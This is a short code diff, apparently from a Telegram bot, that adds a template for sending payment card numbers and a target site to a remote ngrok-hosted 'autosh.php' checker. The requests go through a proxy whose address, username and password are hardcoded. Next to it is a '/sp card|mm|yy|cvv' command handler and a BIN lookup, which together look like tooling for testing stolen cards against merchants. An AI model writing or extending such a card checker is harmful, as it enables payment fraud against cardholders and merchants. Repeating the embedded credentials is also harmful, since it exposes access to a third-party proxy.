@@ -2807,6 +2807,22 @@ async def get_bin_details(bin_number: str) -> dict:
 
     return bin_data
 
+import asyncio
+import aiohttp
+import json
+from html import escape
+from telegram import Update
+from telegram.constants import ParseMode
+from telegram.ext import ContextTypes
+from db import get_user
+
+API_CHECK_TEMPLATE = (
+    "https://7feeef80303d.ngrok-free.app/autosh.php"
+    "?cc={card}"
+    "&site={site}"
+    "&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
+)
+
 async def sp(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handler for /sp card|mm|yy|cvv"""
     user = update.effective_user
@@ -2904,6 +2920,7 @@ async def sp(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"❌ Error: <code>{escape(str(e))}</code>",
             parse_mode=ParseMode.HTML
         )
+
 
 
 
